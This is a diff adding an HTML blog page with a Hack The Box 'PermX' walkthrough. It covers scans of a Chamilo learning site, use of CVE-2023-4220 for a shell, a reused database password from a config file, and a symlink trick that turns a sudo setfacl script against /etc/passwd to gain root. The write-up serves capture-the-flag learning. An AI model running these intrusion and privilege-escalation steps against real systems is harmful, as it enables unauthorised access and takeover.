@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="HTB - Linux - Easy" />
+<meta name="keywords" content=", linux" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/walkthroughs/permx/" />
+
+
+    <title>
+        
+            Permx :: TheFizzyFish 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Permx">
+  <meta itemprop="description" content="HTB - Linux - Easy">
+  <meta itemprop="datePublished" content="2024-08-24T16:50:47-04:00">
+  <meta itemprop="dateModified" content="2024-08-24T16:50:47-04:00">
+  <meta itemprop="wordCount" content="669">
+  <meta itemprop="image" content="http://localhost:1313/">
+  <meta itemprop="keywords" content="Linux">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/">
+  <meta name="twitter:title" content="Permx">
+  <meta name="twitter:description" content="HTB - Linux - Easy">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-08-24 16:50:47 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                $ cd /root/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/common/">Common.txt</a></li><li><a href="/walkthroughs/">Walkthroughs</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/walkthroughs/permx/">Permx</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="enum">Enum</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://permx.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h1 id="80permxhtb">80/permx.htb</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://permx.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Nmap picks up a hostname we need to add to our hosts file <code>permx.htb</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ whatweb permx.htb     
+</span></span><span style="display:flex;"><span>http://permx.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.52<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>permx@htb.com<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.23<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>3.4.1<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>eLEARNING<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Next up is directory enum and vhost enum</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ffuf vhost discovery filtering out status codes 302</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u $URL -H <span style="color:#e6db74">&#39;Host: FUZZ.permx.htb&#39;</span> -fc <span style="color:#ae81ff">302</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>www                     <span style="color:#f92672">[</span>Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 37ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>lms                     <span style="color:#f92672">[</span>Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 71ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Vhost discovery gets us two, <code>www</code> and <code>lms</code>. Nothing interesting from the initial dir enumeration of permx.htb. Maybe one of the vhosts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t <span style="color:#ae81ff">50</span> -x php --exclude-length <span style="color:#ae81ff">274</span> 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 304<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/img                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 304<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/img/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/lib                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 304<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/lib/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 36182<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 303<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://permx.htb/js/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h2 id="lmspermxhtb">lms.permx.htb</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># added to /etc/hosts</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ URL<span style="color:#f92672">=</span>http://lms.permx.htb 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sherlocks/noxious<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t <span style="color:#ae81ff">50</span> -x php -b 404,403 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/bin                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/bin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/user.php             <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; whoisonline.php<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 19356<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/LICENSE              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 35147<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/app                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/app/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/web                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/web/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/main                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/main/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/terms.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16127<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 19348<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/src                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/src/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/plugin               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/plugin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/documentation        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 322<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/documentation/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/vendor               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/vendor/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/certificates         <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 321<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/certificates/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/news_list.php        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 13995<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/custompages          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 320<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://lms.permx.htb/custompages/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/whoisonline.php      <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15471<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/user_portal.php      <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16154<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><code>Powered by chamilo</code></p>
+<p>There&rsquo;s a recent CVE for chamilo &raquo;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220</a></p>
+<p>Checking out to see if the bigUpload.php file exists, at <code>http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported</code>, it appears it does.</p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>Wrote a python script to get a reverse shell with the upload vulnerability</p>
+<p><a href="https://github.com/thefizzyfish/CVE-2023-4220">https://github.com/thefizzyfish/CVE-2023-4220</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@permx:/var/www/chamilo/app/config$ cat configuration.php
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>// Database connection settings.
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_host&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_port&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3306&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;main_database&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chamilo&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_user&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chamilo&#39;</span>;
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_password&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;03F6lY3uXAP2bkW8&#39;</span>;
+</span></span><span style="display:flex;"><span>// Enable access to database management <span style="color:#66d9ef">for</span> platform admins.
+</span></span><span style="display:flex;"><span>$_configuration<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_manager_enabled&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Found a config file with a potential db password. Looking at the /home directory there&rsquo;s another user we can try the cred for <code>mtz</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/permx/CVE-2023-4220<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh mtz@10.10.11.23   
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Mon Jul  <span style="color:#ae81ff">1</span> 13:09:13 <span style="color:#ae81ff">2024</span> from 10.10.14.40
+</span></span><span style="display:flex;"><span>mtz@permx:~$ 
+</span></span></code></pre></div><p>And we got user with <code>mtz:03F6lY3uXAP2bkW8</code></p>
+<h2 id="exploits">Exploits</h2>
+<p><a href="https://github.com/thefizzyfish/CVE-2023-4220">https://github.com/thefizzyfish/CVE-2023-4220</a>
+#CVE-2023-4220</p>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>Since we have a password for <code>mtz</code> first step is to check sudo privs with <code>sudo -l</code></p>
+<p>We can run /opt/acl.sh.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mtz@permx:/opt$ cat acl.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$#<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">3</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Usage: </span>$0<span style="color:#e6db74"> user perm file&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>perm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$3<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> /home/mtz/* <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> *..* <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Access denied.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the path is a file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> ! -f <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Target must be a file.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/sudo /usr/bin/setfacl -m u:<span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74">&#34;</span>$perm<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$target<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>There&rsquo;s a filter blocking us from specifying a path outside of <code>/home/mtz</code> or including <code>..</code> within the path. We can get around this by sym-linking to another file and running the command.</p>
+<p>In this case I gave mtz control of the passwd file, we can remove the password for root by removing the x after the <code>root:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mtz@permx:~$ ln -s /etc/passwd passwd.txt
+</span></span><span style="display:flex;"><span>mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd.txt
+</span></span><span style="display:flex;"><span>mtz@permx:~$ head passwd.txt 
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mtz@permx:~$ 
+</span></span></code></pre></div><h2 id="exploits-1">Exploits</h2>
+<hr>
+<h1 id="postpivot">Post/Pivot</h1>
+<hr>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="http://localhost:1313/"></a></span>
+            <span></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by Four Gnomes in a Hoodie</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
